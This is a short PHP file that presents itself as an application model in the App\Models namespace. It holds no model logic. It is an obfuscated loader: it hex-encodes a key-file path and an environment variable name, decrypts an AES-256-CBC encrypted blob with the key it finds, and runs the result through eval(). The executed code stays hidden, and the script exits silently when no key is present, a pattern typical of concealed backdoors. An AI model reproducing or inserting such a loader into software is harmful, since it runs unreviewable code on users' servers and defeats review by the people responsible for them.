<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('7a57ihoddRl/vuaWN302XA==');

$c=base64_decode(

'AQ2gXq13L6yKVa2zfsY2ad8hw4PZwSTVyY3oAyk3IZHvJVyn08nB/2Ss47VCfgzW4KfU1SkSlYOY' .
'ulJpwHrZkmfNhDz6RgCh/ozgU+hNNvWqWR0KNKZXF/8agOVfkom/CSMB9AG9zGgI+UlWr+NK76bx' .
'Pf+V+sv6s8178SU3wa8XG2+dPDg/gcSNYzizx5dBsi5itH8NgDXBCIpPOoB8LOCWB5wWD4upkiMk' .
'FFrrZJShMvzvnWlWbWOu01Nu3dATHHtFuGF++drdXXSMAkHXkE4tKG05plgRVzAEmAjntu29UDnG' .
'U+vHFecmOuJJjC8U4OAq0qF6+W9XYOnJvPI9YePoxuxoW+KuRniCjzDttQgMzP//cMtBau3puGvS' .
'KQrXY+jbe6ns1sXAYJq4vNJP2QrgZkzGymBpoAfMPEcujWIqHzG61EjBLfvHzYVlr727PK70X0rP' .
'b1ZlhmQ1dxsM4IN70TpBCc5Pr6yfMbt/6Wkq4wqVEG1vmRcPZdjKATffNUsr24iKIwwtrFXpDrL5' .
'ghakwRfpbh3dod0OyCXOwy63elSDGpenF0HHvJIZhmikHDJaKu7rv9If4oftr41l6kdutfl0xlPG' .
'8ZzEpYHRwZ20VqBH08t93vti+uBBbRMcBwwhSqblHoA0SX4LaHrLXmSMxZJI57tlW31OjzWqMQ8+' .
'y/2LxLGnhUmWRn2kowQwh55PbWlS6pHAJTEo6iwB2XjKQf+3g4Dz5VSwuXg3lbVFYh/k6sOpFgGF' .
'IxRPbhyjPUDnlevklHSQL25gRWIWeAxtDKCSDRxR2VNuVMwZD1kmm5uC7bYEUU7VZ/KlYMQvEqma' .
'Pcr/f6cjKiNl5Z064MYfuVBguwwRZ+zXXzH0rIlLvVG29V02cForMuRjhdbPtBoNJdoykwmUSVVR' .
'6y8GUj2X79h+3ANie9E4jf8ksKPCkZlJ2X0deoLeUHkSrAPMXT524b2mXbcGHVfBV9Yq7Q=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

